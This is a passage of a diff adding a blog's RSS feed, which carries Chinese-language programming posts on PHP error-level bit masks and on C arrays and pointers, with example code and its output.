+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000011&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;E_ERROR&lt;/code&gt;和&lt;code&gt;E_WARNING&lt;/code&gt;对应的位为1，其他类型错误对应的位为0，表示只有&lt;code&gt;E_ERROR&lt;/code&gt;和&lt;code&gt;E_WARNING&lt;/code&gt;类型的错误将被显示。&lt;/p&gt;
+&lt;p&gt;例程如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;ini_set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;display_errors&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;E_ERROR&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;E_WARNING&lt;/span&gt;);
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_NOTICE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $var;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_USER_DEPRECATED
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;trigger_error&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;deprecated error triggered&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;E_USER_DEPRECATED&lt;/span&gt;);
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_WARNING
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_ERROR
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;();
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行，输出&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PHP&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Warning&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;Division&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zero&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;PHP&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;Uncaught&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Call&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;undefined&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除了&lt;code&gt;E_NOTICE&lt;/code&gt;和&lt;code&gt;E_USER_DEPRECATED&lt;/code&gt;级别的错误，&lt;code&gt;E_WARNING&lt;/code&gt;和&lt;code&gt;E_ERROR&lt;/code&gt;级别的错误均被显示。&lt;/p&gt;
+&lt;p&gt;以上，便是&lt;em&gt;位运算在PHP错误级别中的运用&lt;/em&gt;。&lt;/p&gt;
+&lt;p&gt;其他需要探究的问题&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;PHP为什么使用位运算处理错误级别的组合？&lt;/li&gt;
+&lt;li&gt;有没有其他类似的位运算应用？&lt;/li&gt;
+&lt;li&gt;为什么位运算速度快？&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;</description>
+    </item>
+    <item>
+      <title>C语言中的数组和指针</title>
+      <link>https://username.github.io/c%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88/</link>
+      <pubDate>Sat, 08 Jun 2019 21:54:28 +0800</pubDate>
+      <guid>https://username.github.io/c%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88/</guid>
+      <description>&lt;p&gt;先看段代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;344&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;243&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;};
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) 
+      &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;数组&lt;code&gt;arr&lt;/code&gt;的每个元素的地址，依次被打印，运行结果如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c45b590&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c45b594&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c45b598&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c45b59c&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c45b5a0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;每个地址相差4，正好是一个&lt;code&gt;int&lt;/code&gt;型整数占的字节数。&lt;/p&gt;
+&lt;p&gt;问题来了，&lt;strong&gt;是不是每个元素的地址，正好相差元素数据类型所占的字节数呢？&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;答案：是的。&lt;/p&gt;
+&lt;p&gt;再来看段代码验证一下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abcd&amp;#34;&lt;/span&gt;;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) 
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
+
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;double&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;10.000&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13.2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15.6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;123.678&lt;/span&gt;};
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) 
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8577&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8578&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8579&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c857a&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c857b&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;--------------&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8580&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8588&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8590&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c8598&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5c2c85a0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;字符串可被看作字符数组，每个字符占1个字节，地址相差1。&lt;/p&gt;
+&lt;p&gt;双精度型数组，每个元素占8个字节，地址相差8。&lt;/p&gt;
+&lt;p&gt;可见，上面的结论是对的。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;地址&lt;/code&gt;到底指什么呢？&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;依据&lt;a href=&#34;http://faculty.cs.niu.edu/~mcmahon/CS241/Notes/pointers.html&#34;&gt;这里&lt;/a&gt;的描述&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The &lt;strong&gt;address of a variable&lt;/strong&gt; is the address of its first byte of storage that it occupies&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;每个变量可能会占若干字节，变量&lt;code&gt;地址&lt;/code&gt;指的是它所占的第一个字节的地址。&lt;/p&gt;
+&lt;p&gt;所以，当我们打印数组每个元素的地址时，实际上是在打印每个元素所占的第一个字节的地址。&lt;/p&gt;
+&lt;p&gt;说到地址，自然想到指针，于是我们想知道&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;究竟啥是指针？&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;通常所说的指针是指&lt;code&gt;指针变量&lt;/code&gt;，这种变量的值是十六进制的地址，而该地址可能属于另一个变量。所以，&lt;em&gt;通过指针变量可以取到它所存的地址所属的变量（或许没有变量）的值&lt;/em&gt;。举个例子&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;;
+
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;);
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;p&lt;/code&gt;是指针变量，它的值是变量&lt;code&gt;a&lt;/code&gt;的地址，通过&lt;code&gt;*p&lt;/code&gt;获取到&lt;code&gt;a&lt;/code&gt;的值。运行结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5065d5a8&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再回到数组，做个实验&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;344&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;243&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;};
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;);
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5d0d0590&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fff5d0d0590&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可见，数组名&lt;code&gt;arr&lt;/code&gt;本身可被看作一个&lt;code&gt;指针变量&lt;/code&gt;，它保存的正是第一个元素的地址。在c语言中，&lt;code&gt;arr+1&lt;/code&gt;表示指针指向下一个元素的地址，所以，下面的等式是成立的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;])
+&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;综上所描述，可得结论&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;数组名可看作指向数组第一个元素的指针，指针加n，则指向数组第n个元素&lt;/em&gt;&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
